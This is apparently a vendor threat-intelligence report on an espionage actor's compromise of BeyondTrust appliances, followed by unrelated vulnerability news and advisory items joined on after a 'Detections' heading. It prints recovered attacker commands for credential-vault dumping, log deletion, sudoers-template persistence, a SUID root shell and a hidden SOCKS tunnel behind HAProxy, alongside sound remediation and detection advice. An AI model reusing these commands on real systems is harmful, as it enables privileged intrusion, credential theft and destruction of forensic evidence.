Figure 1: ARMORY CASTLE BeyondTrust compromise sequence of events

Staging Webshell

After successful exploitation of CVE-2026-102764, ARMORY CASTLE initiated POST requests to /app_84304470%2Ephp. Mandiant was unable to recover the file associated with the POST requests. Approximately 11 minutes following the initial POST request, the file system recorded the creation of the SAWFLY webshell at the web root path /%SITE_SERVICE_ACCOUNT%/ingredi/app/laravel/public/. ARMORY CASTLE leveraged the SAWFLY webshell as one of their primary footholds within the environment over the course of the intrusion.

SAWFLY Webshell

SAWFLY (mangoapi.php) is an obfuscated, lightweight PHP webshell that implements bidirectional encrypted C2 communication using a custom Base32 transport layer and a 256-bit RC4 stream cipher. The webshell inspects incoming HTTP POST requests for the obfuscated parameter _c94mfe.

If the parameter is absent, the script immediately sets HTTP status 404 Not Found (http_response_code(404)) and exits to evade automated web crawlers and vulnerability scanners. When the _c94mfe parameter is supplied, the webshell Base32-decodes the payload, decrypts it using RC4 with a hardcoded 32-byte key and executes the resulting PHP code via @eval(). Any non-null return value from the evaluated code is RC4-encrypted with the same key, Base32-encoded, and echoed back to the client.

Privilege Escalation via SUID Bit Permissions

The SAWFLY webshell ran under the site's service account, an unprivileged local user. To escalate privileges, the threat actor copied the system shell executable (/bin/sh) to the file /usr/bin/dbus-authd.

The threat actor then modified the file's ownership to root and enabled Set User ID (SUID) permissions. When a binary has SUID permissions enabled, it executes with the privileges of the file's owner (root) rather than the user running the command, effectively granting the threat actor a persistent root-level backdoor on the host system.

After establishing a foothold through the web shell, the actor elevated from the web service account to root-level control of the appliance host. This gave them access to every credential the appliance stored or brokered and the ability to modify files that survive reboot and configuration reset.

Credential Harvesting: BeyondTrust Vault Extraction

Mandiant observed the threat actor attempt to harvest credentials directly from the appliance's native secrets management database. To achieve this, the actor leveraged the /ns/sbin/bt-secrets binary which is a proprietary, administrative Command Line Interface (CLI) utility native to BeyondTrust appliances used to manage, store, and retrieve passwords, API keys, and endpoint credentials.

The threat actor systematically iterated through several CLI syntax variations to locate and dump the appliance's credential vault:

/ns/sbin/bt-secrets get -p %SITE_SERVICE_ACCOUNT% vault /ns/sbin/bt-secrets get %SITE_SERVICE_ACCOUNT% vault /ns/sbin/bt-secrets get vault

Figure 2: Recovered Commands from message logs

First, the threat actor attempted to target the vault for a specific site service account in order to pull passwords and keys assigned exclusively to that profile.

Next, they issued a fallback command, targeting the global, appliance-level password safe to dump all stored administrative credentials.

The threat actor concluded their interaction with the bt-secrets binary by forcibly removing the records stored in /home/bomgar/log/bt-secrets.log and any archived files.

/usr/sbin/sh -c 'rm -f /home/bomgar/log/bt-secrets.log /home/bomgar/log/bt-secrets.log.* 2>/dev/null;'

Figure 3: Recovered Commands from message logs

Persistence

For long-term persistent access, Mandiant observed the threat actor target the BeyondTrust configuration templates to grant passwordless root privileges to the site service account.

First, the threat actor created the /home/bomgar/sbin/post_boot.d directory, which is reserved for scripts executed automatically at system startup. Within this directory, they created a shell script named zz-root-persist.

The contents of the zz-root-persist script indicate that it first checks if the user account is already granted passwordless root privileges within the /ns/config/sudoers.template file. If the entry is missing, the script appends '%SITE_SERVICE_ACCOUNT% ALL=(ALL) NOPASSWD: ALL' to the template. This entry added to the sudoers template grants the site user account passwordless administrative privileges to execute any command on the host system.

Finally, the script executes '/ns/sbin/bt-sysconfig' --no-restart misc, which forces the appliance backend to immediately parse /ns/config/sudoers.template and rebuild the active /etc/sudoers file. This strategy ensures the threat actor's privilege escalation survives system reboots and configuration resets, which would normally overwrite manual changes made directly to /etc/sudoers.

#!/bin/bash grep -qF '%SITE_SERVICE_ACCOUNT% ALL=(ALL) NOPASSWD: ALL' '/ns/config/sudoers.template' || echo '%SITE_SERVICE_ACCOUNT% ALL=(ALL) NOPASSWD: ALL' >> '/ns/config/sudoers.template' '/ns/sbin/bt-sysconfig' --no-restart misc

Figure 4: Contents of zz-root-persist

Anti-Forensics

Throughout their unauthorized access to the appliance, Mandiant observed multiple instances where the threat actor attempted to impair defenses and hinder detection by systematically deleting system, web server, and application-level logs.

Originating from the SAWFLY webshell, the threat actor executed the following command using elevated sudo privileges to delete active logs across both host and site-specific directories:

'rm -f \'/ns/log/auth.log\' \'/ns/log/ssl.log\' \'/ns/log/proto-handler.log\' \'/ns/log/bt-docker.log\' \'/ns/log/http-access.log\' \'/ns/log/http-errors.log\' \'/ns/log/php-fpm.log\' \'/ns/log/php-fpm-access.log\' \'/ns/log/php_debug.log\' \'/ns/log/php_web_errors.log\' \'/var/log/messages\' \'/home/%SITE_SERVICE_ACCOUNT%/ingredi/log/httpd_access.log\' \'/home/%SITE_SERVICE_ACCOUNT%/ingredi/log/httpd_error.log\' /tmp/sshauth.*'

Figure 5: Recovered Command

Lateral Movement: BeyondTrust Admin Session Abuse

After the compromise of the BeyondTrust device, the threat actor pivoted into the BeyondTrust Remote Support application to perform reconnaissance via compromised Administrator credentials. First, the threat actor leveraged the Administrator account to log into the web administrative portal.

{ "event": "login", "status": "success", "target": "web/login", "who": "[REDACTED_USERNAME] using password", "who_ip": "[REDACTED_IP]" }

Figure 6: BeyondTrust Syslog Entry

After testing their initial access and verifying their ability to temporarily join the native Administrators group policy, the threat actor altered their strategy for long-term persistence. The actor directly modified the compromised account's permissions, upgrading both local Jump Items and Team permissions from No Access to Administrator. Jump Items are individual systems or devices that are made available for remote access within a Jump Group, enabling administrators to organize and control access to remote systems. This configuration change granted the threat actor permanent, unrestricted authorization to launch remote sessions to downstream systems populated within the appliance's Jump Item list.

{ "event": "user_changed", "old_username": "[REDACTED]", "old_permissions:jump_item_role:default:id": 1, "new_permissions:jump_item_role:default:id": 3, "old_permissions:jump_item_role:default:name": "No Access", "new_permissions:jump_item_role:default:name": "Administrator", "old_permissions:jump_item_role:teams:id": 1, "new_permissions:jump_item_role:teams:id": 3, "old_permissions:jump_item_role:teams:name": "No Access", "new_permissions:jump_item_role:teams:name": "Administrator" }

Figure 7: BeyondTrust Syslog Entry

Internal Reconnaissance

Once the threat actor obtained elevated administrative privileges, Mandiant observed the threat actor establish a remote support session to target internal endpoints.

Once connected, the threat actor leveraged the appliance’s built-in support tools to request and obtain full file-system access. The threat actor utilized the native BeyondTrust Remote Support file transfer service to download and exfiltrate sensitive internal documents useful for network reconnaissance, such as software inventories, directly from the user's desktop environment.

BARECLAW Tunneler

Mandiant observed the threat actor tunnel traffic through the BeyondTrust device via a custom SOCKS5 proxy tunneler. BARECLAW is a tunneler written in C that provides a SOCKS5 proxy service carried over the WebSocket transport and relays TCP connections between a remote client and destinations. BARECLAW statically embeds a CivetWeb WebServer to supply its HTTP and WebSocket functionality and utilizes OpenSSL for TLS. BARECLAW is configurable and provides the option to require authentication, to encrypt data between the client and tunneler, to restrict reachable destinations to specific CIDR ranges, to chain traffic to an upstream proxy, and to modify its default WebSocket endpoint and listening ports. TLS is enabled by providing a PEM certificate while authentication, encryption, destination filtering, and TLS are disabled by default.

BARECLAW receives its configuration through CLI input and it provides a CLI option menu:

Usage: %s [options] --listen PORT plain ws port (default 8080) --listen-tls PORT wss port (default 8443, needs --ssl-cert) --ssl-cert FILE PEM certificate (enables wss) --token STRING shared secret (?token= auth + obfs seed) --obfs enable XOR stream obfuscation --timeout SEC idle timeout (default 300) --connect-timeout SEC target connect timeout (default 10) --max-tunnels N concurrent tunnel limit (default 100) --allow-net CIDR allowed target subnet (repeatable) --upstream [socks5://]host:port route via upstream SOCKS5 --threads N civetweb worker threads (default 64) --ws-path PATH websocket endpoint path (default /wsproxy) -q, --quiet zero output (all logging suppressed) -h this help

Figure 8: BARECLAW CLI Option Menu

The threat actor executed BARECLAW through the following command line arguments:

/tmp/ingredi_ws --listen 19800 --token %REDACTED% --obfs -q --ws-path /uidchanarge

Figure 9: BARECLAW full Command-Line Arguments

This command line configures BARECLAW to listen on TCP port 19800 and create the WebSocket endpoint /uidchanarge on the victim system. Clients are required to authenticate using the token specified in the command line arguments while the -q argument suppresses the tunneler’s logging. Tunneled data is encrypted with an XOR-based routine derived from that token and an 8-byte value provided by the client at the start of the session. The lack of the --ssl-cert and --listen-tls arguments in the CLI options means TLS was not enabled in this specific instance.

Modifications to Haproxy.conf

In addition to the creation of the BARECLAW tunneler, Mandiant observed the threat actor modify the /ns/config/haproxy.conf file in order for BARECLAW to be accessible directly from the internet. The HAProxy service running on BeyondTrust devices acts a reverse proxy for the device that accepts incoming requests on behalf of the BeyondTrust server and forwards the request to the appropriate backend services running on the local system (such as web interfaces, administration portals, or application gateways) based on the request's port or URL path.

The haproxy.conf file is the primary configuration script that dictates how the BeyondTrust appliance handles, routes, and secures incoming traffic. The threat actor modifications first established an Access Control List (ACL) named wswsws to monitor incoming traffic for the specific URI path /uidchanarge. When a request matching this path is detected, HAProxy bypasses normal appliance web services and routes the traffic to a custom backend designated as webskd3.

acl wswsws path /uidchanarge use_backend webskd3 if wswsws

Figure 10: ACL Modification to haproxy.conf

Next, the webskd3 backend routes the incoming web stream locally (127.0.0.1 / localhost) to TCP port 19800, where the BARECLAW utility is actively listening. This local-only binding ensures that the backdoor listener remains completely hidden from external network scans, as it can only be reached internally via HAProxy's local redirection.

backend webskd3 mode http server websocks5srv 127.0.0.1:19800 option http-keep-alive timeout server 28s timeout tunnel 5h

Figure 11: Backend Route Modification to haproxy.conf

Attribution

GTIG attributes the zero-day exploitation of CVE-2026-102764 and the subsequent deployment of SAWFLY and BARECLAW to the suspected PRC-nexus espionage actor ARMORY CASTLE (formerly tracked as UNC5221). The tooling and TTPs leveraged within this intrusion align with previously observed activity from ARMORY CASTLE.

GTIG has previously reported ARMORY CASTLE exploiting multiple vulnerabilities in edge appliances and deploying an extensive suite of custom tooling to support their objectives, ranging from passive backdoors and webshells to trojanized components of edge devices. ARMORY CASTLE has been active as early as October 2023 and has targeted a wide range of countries and verticals during their operations.

Outlook and Implications

In past campaigns, ARMORY CASTLE has conducted widespread and opportunistic exploitation following the public disclosure of vulnerabilities it had exploited selectively as zero-days, racing to infiltrate target organizations before patches are deployed. It is possible that we will observe similar widespread exploitation attempts associated with CVE-2026-102764.

GTIG assesses with high confidence that ARMORY CASTLE will continue to leverage zero-day vulnerabilities in edge devices to gain access to environments to support their espionage objective. Defenders should also prepare for the possibility that following disclosure of CVE-2026-102764, ARMORY CASTLE may conduct widespread exploitation similar to what GTIG observed in 2024 following the disclosure of CVE-2023-46805 and CVE-2024-21887.

Remediation and Hardening

Organizations that have not yet applied the BT26-05 patch should immediately assess their exposure and risk, and review additional guidance from BeyondTrust in their blog. CVE-2026-102764 affects all supported Remote Support versions up to 26.2.3 and allows an unauthenticated remote attacker to perform file operations on the appliance, which can lead to host-level control and access to every credential the appliance stores or brokers. Any appliance that was reachable from the internet on a vulnerable version during the exploitation window should be treated as potentially compromised until it has been reviewed. Mandiant recommends a phased, patch-first approach that balances containment against disruption to support operations.

Immediate Mitigation

Organizations should choose among the following options based on their risk tolerance, evidence of compromise, and operational needs.

Option 1: Apply the BT26-05 Patch (Mandiant Recommended)

Remote Support SaaS: BeyondTrust applied the patch to all SaaS tenants on October 9, 2026. No customer action is required for the appliance itself. The credential and configuration steps in Option 3 still apply.

Self-hosted, version 24.3.1 or later: Apply the BT26-05-RS patch from the /appliance interface, or confirm it was applied automatically if the appliance is subscribed to automatic updates.

Self-hosted, older than 24.3.1: Upgrade to a supported version, then apply the patch. Upgrading closes the vulnerability but does not remediate prior exposure.

If the patch is not visible in /appliance, open a case with BeyondTrust Support referencing BT26-05.

Option 2: Isolate Compromised or Suspected Appliances

Preserve before acting: Snapshot virtual appliances with memory and export the disk before any change or reboot. For B Series hardware and SaaS tenants, request forensic preservation through BeyondTrust Support. Collect syslog, reverse-proxy or WAF, and perimeter firewall logs for the full exposure window, since an attacker with host access can delete on-appliance logs. Mandiant determined that the actor removed logs throughout the incident.

Isolate at the perimeter: Block inbound traffic to the appliance's public address at the firewall rather than in /appliance, so the configuration remains intact for review.

Restrict egress: Deny outbound traffic except to BeyondTrust update and licensing endpoints, and log every denied connection.

Terminate access paths: End active support sessions and disable new sessions, Jump Clients, Jumpoints, and API accounts from /login. Disable rather than delete so the audit trail survives.

Rebuild rather than clean: Redeploy appliances with confirmed or unknown compromise status from a clean, fully patched image. Customers cannot audit the appliance host file system, and host-level persistence survives reboot and configuration reset. Restore only a configuration backup dated before the exposure window, or restore the newest backup while isolated and complete the review in Option 3, Part B, before reconnecting anything. Issue a new TLS certificate and redeploy Jump Clients, Jumpoints, and the representative console from the rebuilt appliance.

Note: Isolation and session termination interrupt support operations. Organizations should coordinate with help desk and vendor-support stakeholders before proceeding.

Option 3: Apply Targeted Compensating Controls

The following controls reduce exposure and limit post-exploitation impact. They do not substitute for the patch.

Part A: Network Restrictions

Restrict access to the /login and /appliance administrative interfaces by IP or network segment at the appliance level. Only representative console, customer portal, and Jump Client traffic should be reachable from the internet.

Where operationally possible, place a reverse proxy or WAF with full URI logging in front of the appliance to keep a record of request paths that the appliance cannot alter.

Part B: Credential Rotation and Configuration Review

Revoke sessions and enrollments: End all active support sessions, then redeploy Jump Clients, Jumpoints, and the representative console from the patched or rebuilt appliance to invalidate existing tokens.

Rotate credentials in dependency order: /appliance administrative credentials; /login administrators and local users; API client secrets; security provider bind accounts and SAML signing keys; Remote Support Vault and integrated Password Safe or Privileged Remote Access (PRA) credentials, rotated at the target system; integration credentials (SMTP, syslog, Information Technology Service Management (ITSM) connectors, outbound event secrets); and any credential typed into a support session during the window.

Review the /login configuration against a pre-window baseline: user and role changes, particularly Jump Item roles raised to Administrator; group and session policies; API accounts; security providers; Jump Items and Jumpoints; and outbound event or syslog destinations. Remove anything without a change record or a named owner.

Review support session reports for the window, including file transfers, to establish which endpoints were accessed and what left them. Every endpoint touched is in scope for downstream hunting.

Note: Rotate credentials only after the appliance has been patched or rebuilt. Rotating earlier exposes the new credentials to an attacker who still controls the appliance.

Part C: Control Plane Restrictions

Require SAML single sign-on with phishing-resistant MFA for all /login users, and remove local accounts except one vaulted break-glass account with alerting on use.

Ensure the built-in Admin account is configured with Multi-Factor Authentication (MFA) in accordance with the official BeyondTrust Two-Factor Authentication Guidelines.

Set the default Jump Item role in every group policy to No Access, and grant roles through policy rather than per user.

Scope API accounts to the minimum permission set, with a named automation owner for any account holding user or Jump Item management rights, and rotate API secrets on a schedule.

Keep privileged credentials in Password Safe or an external vault with credential injection rather than in the Remote Support Vault, and store only non-interactive service account credentials on the appliance.

Apply default-deny outbound filtering from the appliance, allowing only BeyondTrust endpoints and the organization's own syslog and directory servers.

Part D: Logging and Detection Engineering

Logging and Visibility

Forward appliance syslog to a SIEM over TLS with retention that covers a multi-month exposure window, and collect reverse-proxy or WAF and perimeter firewall logs for the appliance's address.

Export /login session, team activity, and user audit reports on a schedule.

Detection Engineering

Account and policy changes: user_changed events that raise a Jump Item or team role; user_added, api_account, and security_provider events with no change ticket; any change to outbound events or syslog destinations.

Authentication: /login success from residential-broadband or commercial-VPN address space, and administrative logins outside business hours.

Session activity: file-transfer events, and sessions started by accounts whose roles changed during the window.

Request paths: at the reverse proxy or WAF, paths outside the known Remote Support path set, including unknown .php paths and WebSocket upgrades from outside support staff and endpoint address ranges.

Anti-forensics: gaps in syslog forwarding from the appliance; an interruption bounded by a single session is a strong indicator of log tampering.

Indicators of Compromise (IOCs)

To assist the wider community in hunting and identifying activity outlined in this blog post, we have included indicators of compromise (IOCs) in a GTI Collection for registered users.

Detections

Vulnerabilities & Patching.title: Warning Over High-Risk Vulnerabilities in Widely Used LLM Gateway Tool
Vulnerabilities & Patching.context: Attackers Hide Malware Behind Signed ChatGPT and Claude Binaries Attackers Exploit Teams External Chat to Breach Organizations in Under 15 Minutes Online Scam Volumes Double to...
Vulnerabilities & Patching.full_text:
High-risk cybersecurity vulnerabilities have been uncovered in a widely deployed large language model (LLM) gateway tool used by organizations to connect their AI applications to AI software providers including OpenAI, Google and Anthropic.

With almost 100,000 downloads a month, LiteLLM is an open-source tool widely used across enterprises to aid with the building of AI applications and services.

The two vulnerabilities, tracked as CVE-2026-35029 and CVE-2026-59823, could allow any user to gain administrative access to the LLM gateway.

According to cybersecurity researchers at Check Point, this could potentially allow an attacker to perform a full system takeover, providing them with file access, the ability to steal login credentials and even the powers to remotely execute code.

The findings were detailed in a blog post published on October 13, and the vulnerabilities affect versions of LiteLLM that are older than version 1.83.9.

LLM gateways are systems that sit between an application and one or more LLM providers. Instead of calling model APIs directly, applications route requests through a gateway, which then forwards those requests to the appropriate model backend.

Exploits Allow Full System Takeover

Importantly, LLM gateways are often used to centralize management of activities such as credential management, logging and usage tracking. That means the gateways are responsible for storing API keys for every AI provider the organization uses, as well as managing user access through roles and permissions.

By combining this level of access with the CVE-2026-35029 vulnerability, an attacker could exploit a missing authorization check to modify a runtime configuration, potentially allowing full system takeover and remote code execution via malicious Python modules loaded from cloud storage.

Meanwhile, the vulnerability tracked as CVE-2026-59823 could allow an attacker to exploit server-side request forgery to redirect the gateway’s outbound requests, exposing AI provider API keys.

“In practical terms, anyone holding an account on a vulnerable LiteLLM deployment could take over the gateway and use it for malicious purposes,” said Mateo Rojas-Carulla, head of research for AI agent security at Check Point.

Check Point reported both vulnerabilities to LiteLLM through the coordinated disclosure process and LiteLLM version 1.83.9, and all later versions include the fixes to close off the vulnerabilities. Users have been urged to make sure their version of LiteLLM is up to date.

“These findings are familiar application security failures. A missing permission check allowed low-privileged users to reach administrative functions with consequences including code execution,” said Christopher Jess, senior R&D manager at Black Duck, an application security company.

“Centralizing AI access makes such gateways a particularly valuable target which should be secured accordingly. This is another example of the worrying trend of security fundamentals being treated as secondary concerns as adoption of the AI ecosystem accelerates,” he added.

How to Protect Against AI Vulnerability Exploits

In addition to updating to the latest version of LiteLLM, Check Point recommended the companies should apply the following steps to help secure their AI infrastructure:

Review who has access to your gateway. Since any account could be used to exploit these flaws, audit user accounts and remove those that are no longer needed.

Rotate AI provider API keys stored in LiteLLM if there is any indication the gateway was accessed by unauthorized users before patching.

Verify permissions in practice. Confirm that users with limited roles are actually limited, because the gap between configured and enforced permissions is where flaws like CVE-2026-35029 cause the most damage.

Include LLM gateways in security assessments by extending penetration tests and vulnerability assessments to cover AI tooling alongside web applications and cloud infrastructure.

Vulnerabilities & Patching.title: ZDI-26-778: Adobe Photoshop DCM Pixel Data Parsing Integer Overflow Remote Code Execution Vulnerability
Vulnerabilities & Patching.context: Vulnerability Details This vulnerability allows remote attackers to execute arbitrary code on affected installations of Adobe Photoshop
Vulnerabilities & Patching.full_text:
Vulnerability Details

This vulnerability allows remote attackers to execute arbitrary code on affected installations of Adobe Photoshop. User interaction is required to exploit this vulnerability in that the target must visit a malicious page or open a malicious file.

The specific flaw exists within the parsing of DICOM image data. The issue results from the lack of proper validation of user-supplied data, which can result in an integer overflow before allocating a buffer. An attacker can leverage this vulnerability to execute code in the context of the current process.

Additional Details

Adobe has issued an update to correct this vulnerability. More details can be found at: https://www.adobe.com/trust/security/products/photoshop/apsb26-158.html

Disclosure Timeline

2026-08-07 - Vulnerability reported to vendor

2026-10-15 - Coordinated public release of advisory

2026-10-15 - Advisory Updated

Credit

Brandon Evans of TrendAI Zero Day Initiative

Vulnerabilities & Patching.full_text:
Vulnerability Details

This vulnerability allows remote attackers to execute arbitrary code on affected installations of Adobe Photoshop. User interaction is required to exploit this vulnerability in that the target must visit a malicious page or open a malicious file.

The specific flaw exists within the parsing of JPEG image data within PDF files. The issue results from the lack of proper validation of user-supplied data, which can result in an integer overflow before allocating a buffer.
